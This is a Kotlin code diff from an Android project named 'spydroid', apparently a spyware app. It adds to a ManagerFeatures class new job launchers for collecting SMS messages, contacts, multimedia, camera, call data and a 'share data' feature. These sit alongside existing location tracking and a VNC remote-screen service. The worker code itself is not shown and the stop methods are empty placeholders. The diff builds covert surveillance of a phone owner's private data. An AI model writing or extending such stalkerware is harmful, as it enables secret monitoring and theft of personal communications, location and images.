@@ -27,7 +27,13 @@ import androidx.work.WorkRequest
 import net.christianbeier.droidvnc_ng.Constants
 import net.christianbeier.droidvnc_ng.Defaults
 import net.christianbeier.droidvnc_ng.VncService
+import net.spydroid.feature.calls.CallsWork
+import net.spydroid.feature.camera.CameraWork
+import net.spydroid.feature.contacts.ContactsWork
 import net.spydroid.feature.location.LocationWork
+import net.spydroid.feature.multimedia.MultimediaWork
+import net.spydroid.feature.sharedata.ShareDataWork
+import net.spydroid.feature.sms.SmsWork
 
 @Suppress("DEPRECATION")
 class ManagerFeatures(
@@ -87,12 +93,76 @@ class ManagerFeatures(
         fun start() {
             val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(LocationWork::class.java).build()
             WorkManager.getInstance(context).enqueue(myWorkRequest)
-            //val intent = Intent(context, LocationActivity::class.java)
-            //context.startActivity(intent)
+
         }
 
         fun stop() {
-            //val intent = Intent(context, LocationActivity::class.java)
+            //todo
+        }
+    }
+
+    inner class sms() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+        }
+
+        fun stop() {
+            //todo
+        }
+    }
+    inner class contacts() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+        }
+
+        fun stop() {
+            //todo
+        }
+    }
+
+    inner class multimedia() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(MultimediaWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+        }
+
+        fun stop() {
+            //todo
+        }
+    }
+
+    inner class camera() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(CameraWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+        }
+
+        fun stop() {
+            //todo
+        }
+    }
+
+    inner class calls() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(CallsWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+        }
+
+        fun stop() {
+            //todo
+        }
+    }
+
+    inner class shareData() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(ShareDataWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+        }
+
+        fun stop() {
+            //todo
         }
     }
 }
